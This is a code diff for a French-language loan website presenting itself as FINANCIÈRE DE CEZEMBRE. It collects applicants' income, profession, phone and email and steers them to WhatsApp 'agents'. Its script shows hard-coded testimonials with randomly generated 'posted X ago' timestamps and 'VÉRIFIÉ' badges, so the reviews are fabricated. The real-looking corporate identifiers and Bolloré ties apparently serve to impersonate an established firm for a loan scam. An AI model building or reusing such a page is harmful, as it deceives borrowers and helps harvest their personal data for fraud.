@@ -80,6 +80,7 @@
             position: relative; overflow: hidden; min-height: 520px;
         }
 
+        /* --- RÉGLAGES MOBILE SPÉCIFIQUE --- */
         @media (max-width: 991px) {
             .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
             .hero-content { max-width: 100%; margin-bottom: 40px; }
@@ -89,18 +90,23 @@
             .f-grid, .legal-block { margin-left: 0 !important; text-align: center; }
             .f-grid { grid-template-columns: 1fr; }
             .reviews-grid { grid-template-columns: 1fr !important; padding: 20px !important; }
+
+            /* ZONE DE RESPIRATION EN BAS POUR MOBILE */
             footer { padding-bottom: 160px !important; } 
+            
+            /* BOUTON WHATSAPP PLUS PETIT SUR MOBILE */
             .wa-assistant-container { bottom: 15px; left: 15px; }
             .wa-msg-bubble { font-size: 0.6rem; padding: 5px 10px; margin-bottom: 10px; }
             .whatsapp-float-dynamic { width: 52px; height: 52px; font-size: 28px; }
         }
 
+        /* --- SECTION TÉMOIGNAGES --- */
         .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; }
         .reviews-section h2 { color: var(--navy); margin-bottom: 40px; font-size: 2rem; }
         .reviews-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
         .review-card { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; border-top: 3px solid var(--gold); }
         .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
-        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; display: block; font-weight: 600; }
+        .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: block; }
         .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; min-height: 60px; }
         .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; }
         .verified { color: var(--success); font-size: 0.7rem; text-transform: uppercase; font-weight: 800; }
@@ -116,28 +122,65 @@
         }
         input[type="range"]::-webkit-slider-thumb { 
             -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; 
-            background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
+            background: var(--navy); 
+            cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3);
+        }
+        input[type="range"]::-moz-range-thumb { 
+            height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; 
         }
         
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
-        .result-area p { font-size: 0.9rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; animation: blink-soft 3s infinite; }
-        @keyframes blink-soft { 0%, 100% { opacity: 1; } 50% { opacity: 0.8; } }
+        
+        .result-area p { 
+            font-size: 0.9rem; 
+            margin-bottom: 5px; 
+            color: var(--navy); 
+            font-weight: 800;
+            text-shadow: 1px 2px 3px rgba(0,0,0,0.1);
+            animation: blink-soft 3s infinite;
+        }
+        @keyframes blink-soft {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .btn-main:hover { background: var(--gold); }
 
-        .form-input { width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); background-color: var(--white); border-radius: 4px; margin-bottom: 10px; font-size: 1rem; outline: none; color: #000c24; font-weight: 600; }
+        .form-input { 
+            width: 100%; 
+            padding: 12px; 
+            border: 2.5px solid var(--deep-gold); 
+            background-color: var(--white);
+            border-radius: 4px; 
+            margin-bottom: 10px; 
+            font-size: 1rem;
+            outline: none;
+            color: #000c24; 
+            font-weight: 600; 
+        }
+        .form-input:focus { border-color: var(--navy); background-color: #fffef0; }
+
         .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
 
-        .scrolling-security { background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0; overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1; display: flex; }
-        .scrolling-security span { display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600; }
+        .scrolling-security {
+            background: #f0f4f8; color: #004085; font-size: 0.7rem; padding: 8px 0; margin: 10px 0;
+            overflow: hidden; white-space: nowrap; border-top: 1px solid #d1ecf1; border-bottom: 1px solid #d1ecf1;
+            display: flex;
+        }
+        .scrolling-security span {
+            display: inline-block; padding-left: 100%; animation: scroll-text 30s linear infinite; font-weight: 600;
+        }
         @keyframes scroll-text { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
 
         .shine-white { color: #FFFFFF !important; animation: blink-white 3s infinite; }
         @keyframes blink-white { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; text-shadow: 0 0 10px #fff; } }
 
-        #loader-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; }
+        #loader-overlay {
+            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px;
+        }
         .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
@@ -146,6 +189,9 @@
 
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
+
+        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
+        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
 
         footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
         .f-grid, .legal-block { margin-left: 160px; }
@@ -157,12 +203,31 @@
         @keyframes pulse-text { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
 
         .wa-assistant-container { position: fixed; bottom: 30px; left: 30px; z-index: 9999; display: flex; flex-direction: column; align-items: center; }
+        
         .wa-msg-bubble { background: var(--navy); color: white; padding: 10px 15px; border-radius: 12px; font-size: 0.75rem; font-weight: 600; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); border: 1px solid var(--gold); position: relative; animation: fadeInOut 4s infinite; white-space: nowrap; }
         .wa-msg-bubble::after { content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%); border-left: 8px solid transparent; border-right: 8px solid transparent; border-top: 8px solid var(--navy); }
-        .whatsapp-float-dynamic { background-color: var(--whatsapp); color: #FFF; width: 65px; height: 65px; border-radius: 50%; text-align: center; font-size: 35px; display: flex; align-items: center; justify-content: center; text-decoration: none; position: relative; animation: magnet-pulse 2s infinite ease-in-out; }
         
-        @keyframes magnet-pulse { 0% { transform: scale(1); } 10% { transform: scale(1.1) rotate(5deg); } 20% { transform: scale(1.1) rotate(-5deg); } 40% { transform: scale(1) rotate(0deg); } 100% { transform: scale(1); } }
+        .whatsapp-float-dynamic { 
+            background-color: var(--whatsapp); 
+            color: #FFF; width: 65px; height: 65px; border-radius: 50%; 
+            text-align: center; font-size: 35px; box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); 
+            display: flex; align-items: center; justify-content: center; 
+            text-decoration: none; position: relative; 
+            animation: magnet-pulse 2s infinite ease-in-out; 
+        }
+
+        @keyframes magnet-pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
+            10% { transform: scale(1.1) rotate(5deg); }
+            20% { transform: scale(1.1) rotate(-5deg); }
+            30% { transform: scale(1.1) rotate(5deg); }
+            40% { transform: scale(1) rotate(0deg); }
+            70% { box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
+        }
+
         @keyframes fadeInOut { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.8; transform: scale(0.95); } }
+        
         #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
@@ -190,6 +255,7 @@
     <div class="hero-content">
         <h1>L'excellence financière <br>au service de vos projets.</h1>
         <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        
         <div style="display: flex; gap: 20px; align-items: center;">
             <div style="position: relative; display: flex; align-items: center; justify-content: center;">
                 <i class="fas fa-certificate" style="color: #FFD700; font-size: 3.5rem;"></i>
@@ -233,9 +299,11 @@
                 <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800;">€</span>
             </div>
             <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
+            
             <div class="scrolling-security">
-                <span><i class="fas fa-lock" style="color:var(--gold);"></i> Transfert sécurisé SSL 256-bit • Protection garantie des données.</span>
+                <span><i class="fas fa-lock" style="color:var(--gold);"></i> CONFIDENTIALITÉ : Vos données sont strictement confidentielles et ne seront jamais vendues à des tiers. • Transfert sécurisé SSL 256-bit • Protection garantie.</span>
             </div>
+
             <div class="security-tag"><i class="fas fa-lock"></i> VOTRE DOSSIER EST 100% SÉCURISÉ</div>
         </div>
 
@@ -244,29 +312,59 @@
             <form id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
                 <input type="hidden" name="montant_client" id="hiddenAmt"><input type="hidden" name="duree_client" id="hiddenDur"><input type="hidden" name="mensualite_client" id="hiddenMens">
+                
                 <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
+                
                 <select name="projet" class="form-input" required>
                     <option value="" disabled selected>Choisir votre projet</option>
                     <option value="Immobilier">Prêt Immobilier</option>
                     <option value="Personnel">Prêt Personnel</option>
                     <option value="Auto">Auto / Moto</option>
                     <option value="Travaux">Travaux / Rénovation</option>
+                    <option value="Autre">Autre</option>
                 </select>
+
                 <input type="number" name="revenu" placeholder="Revenu mensuel net (en €)" class="form-input" required>
-                <input type="text" name="profession" placeholder="Votre Profession" class="form-input" required>
+                <input type="text" name="profession" placeholder="Votre Profession / Travail" class="form-input" required>
+
                 <select name="pays" class="form-input" required>
                     <option value="" disabled selected>Votre Pays de résidence</option>
                     <option value="France">France (+33)</option>
                     <option value="Belgique">Belgique (+32)</option>
                     <option value="Suisse">Suisse (+41)</option>
                     <option value="Luxembourg">Luxembourg (+352)</option>
-                    <option value="Canada">Canada (+1)</option>
+                    <option value="Monaco">Monaco (+377)</option>
+                    <option value="Allemagne">Allemagne (+49)</option>
+                    <option value="Pays-Bas">Pays-Bas (+31)</option>
+                    <option value="Autriche">Autriche (+43)</option>
+                    <option value="Norvège">Norvège (+47)</option>
+                    <option value="Suède">Suède (+46)</option>
+                    <option value="Finlande">Finlande (+358)</option>
+                    <option value="Danemark">Danemark (+45)</option>
+                    <option value="Italie">Italie (+39)</option>
+                    <option value="Espagne">Espagne (+34)</option>
+                    <option value="Portugal">Portugal (+351)</option>
+                    <option value="Pologne">Pologne (+48)</option>
+                    <option value="Slovaquie">Slovaquie (+421)</option>
+                    <option value="Roumanie">Roumanie (+40)</option>
                     <option value="Kosovo">Kosovo (+383)</option>
+                    <option value="Canada">Canada (+1)</option>
+                    <option value="USA">États-Unis (+1)</option>
                     <option value="Guadeloupe">Guadeloupe (+590)</option>
+                    <option value="Martinique">Martinique (+596)</option>
+                    <option value="Guyane">Guyane Française (+594)</option>
+                    <option value="La Réunion">La Réunion (+262)</option>
                 </select>
-                <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
+
+                <input type="tel" name="telephone" placeholder="Téléphone (ex: +33...)" class="form-input" required>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
+                
+                <div class="scrolling-security">
+                    <span><i class="fas fa-lock" style="color:var(--gold);"></i> Transfert hautement sécurisé. Vos données sont strictement confidentielles et protégées.</span>
+                </div>
+
                 <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
+                <div class="security-tag"><i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit</div>
             </form>
         </div>
     </div>
@@ -275,7 +373,7 @@
 <section class="stats-bar">
     <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
     <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Sécurisé</p></div>
+    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
 </section>
 
 <section class="reviews-section">
@@ -283,17 +381,21 @@
     <div class="reviews-grid" id="reviews-container"></div>
 </section>
 
-<section class="about-section" id="about" style="padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white);">
-    <h2 style="margin-bottom: 30px; color: var(--navy); text-align: center;">Une Institution de Référence</h2>
-    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit. Sous la direction de Monsieur Michel Pajot, nous garantissons une stabilité et une expertise inégalées.</p>
+<section class="about-section" id="about">
+    <h2>Une Institution de Référence</h2>
+    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
+    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen.</p>
 </section>
 
 <footer id="legal">
     <div class="f-grid">
-        <div><h4 class="shine-white">FINANCIÈRE DE CEZEMBRE</h4><p>SIRET 552 058 943 00044</p></div>
-        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500 ERGUÉ-GABÉRIC</p></div>
+        <div><h4 class="shine-white">FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit régulée.<br>LEI : 969500WONJGTDZG8E035</p></div>
+        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France</p></div>
+        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
+        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
     </div>
     <div class="legal-block">
+        <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
         <div class="tag-warning"><span class="blink-gold">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</span></div>
     </div>
 </footer>
@@ -301,121 +403,128 @@
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
-    // --- GESTION WHATSAPP ---
+    // --- GESTION DES MESSAGES WHATSAPP ---
     const waText = document.getElementById('wa-text');
-    const waMsgs = ["Besoin d'aide ?", "Support en ligne", "Un agent vous répond", "Assistance 24h/7j"];
-    let msgIdx = 0; setInterval(() => { msgIdx = (msgIdx + 1) % waMsgs.length; waText.innerText = waMsgs[msgIdx]; }, 4000);
+    const messages = ["Besoin d'aide ? Contactez l'assistance", "Need help? Contact support", "L'un de nos agents vous répond", "An agent is ready to help you"];
+    let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
 
-    // --- GRANDE BASE DE DONNÉES (40 AVIS) ---
-    const bigDatabase = [
-        { n: "Marc L.", p: "France", t: "Service irréprochable, fonds reçus en 48h.", lang: "fr" },
-        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen!", lang: "fi" },
-        { n: "Arber K.", p: "Kosovo", t: "Shërbim shumë i shpejtë dhe korrekt.", lang: "sq" },
-        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask utbetaling.", lang: "no" },
-        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux, taux très compétitif.", lang: "fr" },
-        { n: "Sophie D.", p: "Belgique", t: "Efficace pour mon prêt auto. Merci à l'équipe.", lang: "fr" },
-        { n: "Maria C.", p: "Italie", t: "Finanziamento veloce, eccellente supporto clienti.", lang: "it" },
-        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit der Abwicklung. Top Zinssatz.", lang: "de" },
-        { n: "Jean B.", p: "Canada", t: "Service impeccable même à distance. Très pro.", lang: "fr" },
-        { n: "Luc B.", p: "Monaco", t: "Discrétion et rapidité. Parfait pour mon projet.", lang: "fr" },
-        { n: "Anissa K.", p: "Martinique", t: "Dossier traité rapidement, je recommande vivement.", lang: "fr" },
-        { n: "Pedro S.", p: "Portugal", t: "Processo simples e transparente. Muito bom.", lang: "pt" },
-        { n: "Elena V.", p: "Suisse", t: "Excellente gestion de mon dossier de crédit.", lang: "fr" },
-        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar de încredere. Recomand.", lang: "ro" },
-        { n: "Hans M.", p: "Autriche", t: "Schnelle Bearbeitung und freundlicher Service.", lang: "de" },
-        { n: "Knut S.", p: "Suède", t: "Smidig process och bra villkor. Tack!", lang: "sv" },
-        { n: "Jan de V.", p: "Pays-Bas", t: "Zeer betrouwbaar en snelle reactie. Uitstekend.", lang: "nl" },
-        { n: "Mette H.", p: "Danemark", t: "Fantastisk service hele vejen igennem.", lang: "da" },
-        { n: "Chloe M.", p: "France", t: "Prêt obtenu sans complications. Très satisfaite.", lang: "fr" },
-        { n: "Julien R.", p: "Suisse", t: "Conseillers à l'écoute et réactifs.", lang: "fr" },
-        { n: "Sandro G.", p: "Italie", t: "Ottimo servizio, tutto chiaro e veloce.", lang: "it" },
-        { n: "Kati L.", p: "Finlande", t: "Kaikki sujui odotetusti. Kiitos avusta.", lang: "fi" },
-        { n: "Enver H.", p: "Kosovo", t: "Shumë të kënaqur me kredinë tonë.", lang: "sq" },
-        { n: "Pierre Y.", p: "Guyane", t: "Sérieux et honnête. Pas de frais cachés.", lang: "fr" },
-        { n: "Marta K.", p: "Pologne", t: "Szybka decyzja i pieniądze na koncie.", lang: "pl" },
-        { n: "Victor D.", p: "Belgique", t: "Enfin un organisme qui comprend nos besoins.", lang: "fr" },
-        { n: "Sarah P.", p: "Canada", t: "Efficacité redoutable pour mon prêt travaux.", lang: "fr" },
-        { n: "Oliver L.", p: "Allemagne", t: "Kompetente Beratung und schnelle Zusage.", lang: "de" },
-        { n: "Isabella F.", p: "Espagne", t: "Proceso muy profesional y transparente.", lang: "es" },
-        { n: "Antonio G.", p: "Espagne", t: "Muy satisfecho con el préstamo personal.", lang: "es" },
-        { n: "Fiona C.", p: "Irlande", t: "Fast and reliable service. Highly recommended.", lang: "en" },
-        { n: "Lukas S.", p: "Slovaquie", t: "Všetko prebehlo v poriadku, som spokojný.", lang: "sk" },
-        { n: "Bjorn A.", p: "Norvège", t: "Bra rente og god oppfølging.", lang: "no" },
-        { n: "Claire T.", p: "Guadeloupe", t: "Accompagnement parfait pour mon crédit.", lang: "fr" },
-        { n: "Dimitri P.", p: "Grèce", t: "Πολύ καλή εξυπηρέτηση και γρήγορα αποτελέσματα.", lang: "el" },
-        { n: "Mateo R.", p: "Portugal", t: "Obrigado pela rapidez no meu pedido.", lang: "pt" },
-        { n: "Ingrid S.", p: "Suède", t: "Proffsigt bemötande och tydliga villkor.", lang: "sv" },
-        { n: "Liam O.", p: "Luxembourg", t: "Einfach, schnell und unkompliziert.", lang: "de" },
-        { n: "Nina G.", p: "France", t: "Le meilleur taux que j'ai pu trouver en ligne.", lang: "fr" },
-        { n: "Arnaud V.", p: "La Réunion", t: "Génial, mon projet est enfin lancé !", lang: "fr" }
+    // --- BASE DE DONNÉES DES AVIS INTERNATIONAUX (40 AVIS) ---
+    const internationalReviews = [
+        { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle. Projet réalisé en un temps record.", l: "fr" },
+        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif pour mon prêt frontalier. Top !", l: "fr" },
+        { n: "Jean-Paul H.", p: "Luxembourg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke für alles!", l: "de" },
+        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse pour l'achat de mon véhicule.", l: "fr" },
+        { n: "Elena V.", p: "Suisse", t: "Excellente gestion de mon dossier de crédit. Service très courtois.", l: "fr" },
+        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask utbetaling. Meget bra!", l: "no" },
+        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen kaikille!", l: "fi" },
+        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar serios. Procesul a fost rapid și transparent.", l: "ro" },
+        { n: "Arber K.", p: "Kosovo", t: "Shërbim shumë i shpejtë dhe korrekt. Faleminderit shumë.", l: "sq" },
+        { n: "Maria C.", p: "Italie", t: "Finanziamento ottenuto in tempi record. Molto soddisfatta del supporto.", l: "it" },
+        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung. Empfehlenswert.", l: "de" },
+        { n: "João P.", p: "Portugal", t: "Processo simples e transparente. Recomendo vivamente a Cézembre.", l: "pt" },
+        { n: "Luc B.", p: "Monaco", t: "Service haut de gamme et discrétion totale. Parfait pour mon investissement.", l: "fr" },
+        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec. Très efficace.", l: "fr" },
+        { n: "Anissa K.", p: "Martinique", t: "Une aide précieuse pour mon projet local. Rapide et sérieux.", l: "fr" },
+        { n: "Hans M.", p: "Autriche", t: "Schnelle Bearbeitung und sehr freundliche Berater. Top!", l: "de" },
+        { n: "Knut S.", p: "Suède", t: "Smidig process och pengar på kontot snabbt. Tack!", l: "sv" },
+        { n: "Jan de V.", p: "Pays-Bas", t: "Zeer betrouwbaar en snelle reactie op mijn aanvraag.", l: "nl" },
+        { n: "Mette H.", p: "Danemark", t: "Fantastisk service hele vejen igennem. Kan varmt anbefales.", l: "da" },
+        { n: "Chloe M.", p: "France", t: "Prêt obtenu sans complications. Très satisfaite de l'accueil.", l: "fr" },
+        { n: "Julien R.", p: "Suisse", t: "Conseillers à l'écoute et réactifs. Taux très intéressant.", l: "fr" },
+        { n: "Sandro G.", p: "Italie", t: "Ottimo servizio, tutto chiaro e professionale. Grazie.", l: "it" },
+        { n: "Kati L.", p: "Finlande", t: "Kaikki sujui odotetusti. Erittäin nopea käsittely.", l: "fi" },
+        { n: "Enver H.", p: "Kosovo", t: "Shumë të kënaqur me kredinë dhe mbështetjen e dhënë.", l: "sq" },
+        { n: "Pierre Y.", p: "Guyane", t: "Sérieux et honnête. Pas de frais cachés. Je recommande.", l: "fr" },
+        { n: "Marta K.", p: "Pologne", t: "Szybka decyzja i profesjonalne podejście do klienta.", l: "pl" },
+        { n: "Victor D.", p: "Belgique", t: "Enfin un organisme qui comprend les besoins des indépendants.", l: "fr" },
+        { n: "Sarah P.", p: "Canada", t: "Efficacité redoutable pour mon prêt travaux au Québec.", l: "fr" },
+        { n: "Oliver L.", p: "Allemagne", t: "Kompetente Beratung und sehr schnelle Zusage. Alles bestens.", l: "de" },
+        { n: "Isabella F.", p: "Espagne", t: "Proceso muy profesional y transparente de principio a fin.", l: "es" },
+        { n: "Antonio G.", p: "Espagne", t: "Muy satisfecho con el préstamo personal obtenido aquí.", l: "es" },
+        { n: "Fiona C.", p: "Irlande", t: "Fast and reliable service. Highly recommended establishment.", l: "en" },
+        { n: "Lukas S.", p: "Slovaquie", t: "Všetko prebehlo v poriadku, som veľmi spokojný.", l: "sk" },
+        { n: "Bjorn A.", p: "Norvège", t: "Bra rente og god oppfølging under hele prosessen.", l: "no" },
+        { n: "Claire T.", p: "Guadeloupe", t: "Accompagnement parfait pour mon premier crédit immobilier.", l: "fr" },
+        { n: "Dimitri P.", p: "Grèce", t: "Πολύ καλή εξυπηρέτηση και γρήγορα αποτελέσματα.", l: "el" },
+        { n: "Mateo R.", p: "Portugal", t: "Obrigado pela rapidez no meu pedido de financiamento.", l: "pt" },
+        { n: "Ingrid S.", p: "Suède", t: "Proffsigt bemötande och tydliga villkor hela tiden.", l: "sv" },
+        { n: "Nina G.", p: "France", t: "Le meilleur taux que j'ai trouvé après plusieurs recherches.", l: "fr" },
+        { n: "Arnaud V.", p: "La Réunion", t: "Génial, mon projet est enfin lancé grâce à vous !", l: "fr" }
     ];
 
-    const labels = {
-        fr: { units: ["sec", "min", "h", "j", "sem", "mois"], prefix: "Posté il y a" },
-        fi: { units: ["sek", "min", "t", "pv", "vko", "kk"], prefix: "Lähetetty" },
-        sq: { units: ["sek", "min", "orë", "ditë", "javë", "muaj"], prefix: "Postuar" },
-        no: { units: ["sek", "min", "t", "dg", "uk", "mnd"], prefix: "Lagt ut for" },
-        it: { units: ["sec", "min", "ore", "giorni", "sett", "mesi"], prefix: "Inviato" },
-        de: { units: ["sek", "min", "std", "tg", "woche", "mon"], prefix: "Vor" },
-        en: { units: ["sec", "min", "h", "d", "weeks", "mo"], prefix: "Posted" },
-        es: { units: ["seg", "min", "h", "días", "sem", "meses"], prefix: "Publicado hace" }
+    const timeLabels = {
+        fr: { u: ["sec", "min", "h", "j", "sem", "mois"], p: "Posté il y a" },
+        en: { u: ["sec", "min", "h", "d", "weeks", "mo"], p: "Posted" },
+        de: { u: ["sek", "min", "std", "tg", "wochen", "mon"], p: "Vor" },
+        it: { u: ["sec", "min", "ore", "giorni", "sett", "mesi"], p: "Inviato" },
+        es: { u: ["seg", "min", "h", "días", "sem", "meses"], p: "Publicado hace" }
     };
 
-    function getTimeDisplay(lang) {
-        const l = labels[lang] || labels.fr;
-        const u = l.units;
+    function getTime(lang) {
+        const l = timeLabels[lang] || timeLabels.fr;
         const rand = Math.random();
-        if (rand < 0.2) return ${l.prefix} ${Math.floor(Math.random()*50)+5} ${u[0]}; // Sec
-        if (rand < 0.5) return ${l.prefix} ${Math.floor(Math.random()*55)+1} ${u[1]}; // Min
-        if (rand < 0.7) return ${l.prefix} ${Math.floor(Math.random()*20)+1} ${u[2]}; // Heures
-        if (rand < 0.85) return ${l.prefix} ${Math.floor(Math.random()*6)+1} ${u[3]}; // Jours
-        if (rand < 0.95) return ${l.prefix} ${Math.floor(Math.random()*3)+1} ${u[4]}; // Semaines
-        return ${l.prefix} ${Math.floor(Math.random()*2)+1} ${u[5]}; // Mois
+        if (rand < 0.2) return ${l.p} ${Math.floor(Math.random()*50)+5} ${l.u[0]};
+        if (rand < 0.5) return ${l.p} ${Math.floor(Math.random()*55)+1} ${l.u[1]};
+        if (rand < 0.7) return ${l.p} ${Math.floor(Math.random()*20)+1} ${l.u[2]};
+        if (rand < 0.85) return ${l.p} ${Math.floor(Math.random()*6)+1} ${l.u[3]};
+        if (rand < 0.95) return ${l.p} ${Math.floor(Math.random()*3)+1} ${l.u[4]};
+        return ${l.p} ${Math.floor(Math.random()*2)+1} ${l.u[5]};
     }
 
     function renderReviews() {
         const container = document.getElementById('reviews-container');
         container.innerHTML = "";
-        const selection = bigDatabase.sort(() => 0.5 - Math.random()).slice(0, 12);
-        selection.forEach(r => {
+        internationalReviews.sort(() => 0.5 - Math.random()).slice(0, 12).forEach(r => {
             container.innerHTML += `
                 <div class="review-card">
-                    <span class="review-date"><i class="far fa-clock"></i> ${getTimeDisplay(r.lang)}</span>
+                    <span class="review-date"><i class="far fa-clock"></i> ${getTime(r.l)}</span>
                     <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                     <p class="review-text">"${r.t}"</p>
-                    <div class="review-author">${r.n} (${r.p}) <span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span></div>
+                    <div class="review-author">
+                        <div>${r.n} (${r.p})</div>
+                        <span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span>
+                    </div>
                 </div>`;
         });
     }
+    renderReviews();
 
     // --- CALCULATEUR ---
     const amtR = document.getElementById('amtRange');
+    const amtN = document.getElementById('amtNum');
     const durR = document.getElementById('durRange');
+    const durT = document.getElementById('durText');
+    const resM = document.getElementById('monthlyRes');
+
     function calc() {
         let p = parseFloat(amtR.value); let n = parseInt(durR.value); let r = 0.035 / 12;
-        document.getElementById('amtNum').value = p;
-        document.getElementById('durText').innerText = n + " mois";
+        amtN.value = p; durT.innerText = n + " mois";
         let m = (p * r) / (1 - Math.pow(1 + r, -n));
-        document.getElementById('monthlyRes').innerText = m.toFixed(2);
+        resM.innerText = m.toFixed(2);
         document.getElementById('hiddenAmt').value = p + " €";
         document.getElementById('hiddenDur').value = n + " mois";
         document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
-        amtR.style.backgroundSize = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100 + '% 100%';
-        durR.style.backgroundSize = (durR.value - durR.min) / (durR.max - durR.min) * 100 + '% 100%';
+        
+        let valA = (amtR.value - amtR.min) / (amtR.max - amtR.min) * 100;
+        amtR.style.backgroundSize = valA + '% 100%';
